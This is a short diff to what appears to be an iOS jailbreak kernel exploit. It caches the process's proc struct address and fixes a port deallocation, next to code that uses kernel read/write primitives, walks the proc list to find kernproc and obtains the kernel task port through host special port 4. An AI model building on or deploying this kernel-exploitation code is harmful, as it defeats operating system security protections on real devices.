@@ -341,6 +341,7 @@ extern uint64_t kernel_base;
 extern uint64_t kernel_slide;
 extern uint64_t ReadKernel64(uint64_t kaddr);
 extern void WriteKernel64(uint64_t kaddr, uint64_t val);
+extern uint64_t cached_proc_struct_addr;
 
 // ********** ********** ********** ye olde pwnage ********** ********** **********
 
@@ -831,6 +832,7 @@ value = value | ((uint64_t)read64_tmp << 32)
     uint64_t ourproc = 0x0;
     rk64(ourtask + offsets->struct_offsets.task_bsd_info, ourproc);
     LOG("got ourproc: 0x%llx", ourproc);
+    cached_proc_struct_addr = ourproc;
 
     /* find kernproc by looping linked list */
 
@@ -992,7 +994,7 @@ value = value | ((uint64_t)read64_tmp << 32)
     host = mach_host_self();
     mach_port_t hsp4;
     ret = host_get_special_port(host, HOST_LOCAL_NODE, 4, &hsp4);
-    mach_port_deallocate(mach_host_self(), host);
+    mach_port_deallocate(mach_task_self(), host);
     host = original_host;
     
     /* de-elevate */
